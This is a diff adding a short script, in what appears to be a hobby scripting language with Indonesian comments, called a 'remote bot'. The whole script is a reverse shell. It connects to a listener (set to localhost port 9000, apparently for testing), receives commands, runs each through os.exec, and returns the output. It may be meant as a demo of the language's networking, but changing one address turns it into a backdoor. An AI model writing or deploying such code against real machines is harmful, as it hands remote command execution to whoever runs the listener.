@@ -1,0 +1,52 @@
+print("=== LINK-LANG REMOTE BOT ===")
+
+# Konfigurasi Target (Localhost untuk tes)
+set ip = "127.0.0.1"
+set port = 9000
+
+print("Connecting to " + ip + ":" + port + "...")
+set sock = net.socket()
+
+# Coba connect
+if net.connect(sock, ip, port) {
+    print(term.color("green") + "CONNECTED!" + term.reset())
+    
+    # Kirim banner sambutan ke server
+    net.send(sock, "--- CONNECTED TO NEBULA OS ---\n")
+    net.send(sock, "Type 'exit' to close.\n")
+    
+    while true {
+        # 1. Tampilkan prompt di sisi server
+        net.send(sock, "shell> ")
+        
+        # 2. Terima perintah dari server
+        set cmd = net.recv(sock)
+        
+        # Bersihkan spasi/newline (Penting!)
+        set cmd = str.trim(cmd)
+        
+        if len(cmd) == 0 {
+            continue
+        }
+        
+        if cmd == "exit" {
+            net.send(sock, "Bye!\n")
+            break
+        }
+        
+        print("Executing: " + cmd)
+        
+        # 3. Eksekusi perintah OS (fitur os.exec)
+        # Hati-hati: os.exec kita mengembalikan output sebagai string
+        set output = os.exec(cmd)
+        
+        # 4. Kirim output balik ke server
+        net.send(sock, output + "\n")
+    }
+    
+    net.close(sock)
+    print("Connection closed.")
+    
+} else {
+    print(term.color("red") + "Failed to connect. Is Netcat running?" + term.reset())
+}
